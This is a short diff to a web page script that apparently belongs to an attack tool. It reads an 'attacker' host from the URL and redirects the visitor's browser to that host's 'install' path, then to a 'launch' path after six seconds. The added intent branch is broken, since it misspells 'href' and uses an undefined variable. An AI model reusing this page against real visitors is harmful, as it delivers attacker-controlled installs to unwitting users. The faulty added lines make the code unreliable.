@@ -2,16 +2,23 @@
 <script>
 var yayquerystringyay = window.location.search;
 var yayurlparamsyay = new URLSearchParams(yayquerystringyay);
+var yayintentyay = yayurlparamsyay.get('yayintentyay');
 var yayattackeryay = yayurlparamsyay.get('yayattackeryay');
 
-
+if (yayintentyay)
+{
+    location.herf=intent;
+}
+else if (yayattackeryay){
 location.href="http://" + yayattackeryay + "/yayinstallyay";
 const yayshorttimeout2yay = setTimeout(yaylaunchyay, 6000);
  
 function yaylaunchyay() {
  location.href="http://" + yayattackeryay + "/yaylaunchyay";
 }
+}
 </script>
+
 
 
 
